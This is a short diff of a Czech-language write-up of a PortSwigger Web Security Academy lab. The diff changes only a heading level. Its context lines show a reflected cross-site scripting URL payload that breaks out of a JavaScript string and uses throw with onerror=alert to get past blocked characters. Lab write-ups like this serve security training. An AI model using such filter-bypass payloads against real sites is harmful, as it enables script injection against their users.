@@ -15,7 +15,7 @@ Využitím specifického payloadu, který chytře obcházel blokované znaky (na
 ```text
 [https://YOUR-LAB-ID.web-security-academy.net/post?postId=3&,%27](https://YOUR-LAB-ID.web-security-academy.net/post?postId=3&,%27)}%2Cx%3Dx=>{throw/**/onerror=alert,1337},toString=x,window%2b%2b%2527%27,%27x:%27
 
-# Vysvětlení do podrobná
+## Vysvětlení do podrobná
 
 ** postId=3& – Základní parametr labu pro zobrazení konkrétního příspěvku.
 
